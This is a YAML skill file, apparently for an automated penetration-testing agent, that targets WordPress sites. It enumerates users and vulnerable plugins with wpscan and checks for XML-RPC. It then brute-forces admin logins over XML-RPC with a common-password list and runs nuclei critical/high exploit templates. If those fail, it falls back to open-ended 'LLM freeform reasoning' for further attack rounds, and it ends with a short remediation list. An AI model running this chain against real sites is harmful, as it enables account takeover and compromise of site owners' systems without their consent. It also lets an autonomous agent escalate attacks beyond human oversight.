skill_id: wordpress_exploit
name: "WordPress Vulnerability Exploitation"
category: web_rce
version: "1.0"

principle: |
  WordPress sites are vulnerable through outdated plugins/themes, weak admin
  credentials, and XML-RPC brute-force. wpscan provides comprehensive
  enumeration of plugins, themes, users, and known vulnerabilities.

match:
  rules:
    - fingerprint_contains: ["wordpress"]
    - fingerprint_contains: ["wp-content"]
    - fingerprint_contains: ["wp-login"]
    - evidence_contains: ["wordpress"]
    - evidence_contains: ["wp-"]

probes:
  - id: wpscan_enum
    description: "wpscan full enumeration"
    command: |
      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
      echo "=== WPScan Enumeration ==="
      wpscan --url "$BASE" --enumerate u,vp,vt --no-banner \
        --random-user-agent --format cli 2>/dev/null | head -150
      echo "WPSCAN_DONE"
    timeout: 180
    parse_rules:
      - if_contains: ["[!] Title:"]
        set: { wp_vuln_found: true }
      - if_contains: ["identified"]
        set: { wp_users_found: true }
      - if_contains: ["Upload directory"]
        set: { wp_upload_accessible: true }
      - if_contains: ["XML-RPC"]
        set: { wp_xmlrpc: true }

  - id: check_xmlrpc
    description: "Check XML-RPC availability"
    command: |
      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
      code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/xmlrpc.php" --max-time 8 2>/dev/null)
      echo "XMLRPC_STATUS:$code"
      if [ "$code" = "200" ] || [ "$code" = "405" ]; then
        echo "XMLRPC_AVAILABLE"
      fi
    timeout: 15
    parse_rules:
      - if_contains: ["XMLRPC_AVAILABLE"]
        set: { wp_xmlrpc: true }

exploit_paths:
  - path_id: wp_admin_bruteforce
    name: "WordPress Admin Brute-force"
    priority: 1
    conditions:
      wp_xmlrpc: true
    steps:
      - id: xmlrpc_brute
        description: "XML-RPC multicall brute-force"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== WP XML-RPC Brute Force ==="
          wpscan --url "$BASE" --passwords /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
            --usernames admin,administrator,wp-admin,editor \
            --max-threads 4 --no-banner 2>/dev/null | tail -30
          echo "WP_BRUTE_DONE"
        timeout: 120
        success_criteria:
          stdout_contains_any: ["Valid Combinations Found", "Password:"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "wp_admin"

  - path_id: wp_plugin_exploit
    name: "WordPress Plugin Vulnerability"
    priority: 2
    conditions:
      wp_vuln_found: true
    steps:
      - id: exploit_plugin
        description: "Exploit identified plugin vulnerability"
        command: |
          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
          echo "=== WP Plugin Exploit ==="
          nuclei -u "$BASE" -tags wordpress -severity critical,high \
            -silent 2>/dev/null | head -20
          echo "WP_NUCLEI_DONE"
        timeout: 120
        success_criteria:
          stdout_contains_any: ["[critical]", "[high]"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "wp_plugin_vuln"

  - path_id: llm_freeform
    name: "LLM freeform reasoning"
    priority: 99
    mode: react_freeform
    max_rounds: 6

remediation: |
  1. Keep WordPress core, plugins, and themes updated
  2. Use strong admin passwords and 2FA
  3. Disable XML-RPC if not needed
  4. Use security plugins (Wordfence, Sucuri)
  5. Restrict wp-admin access by IP
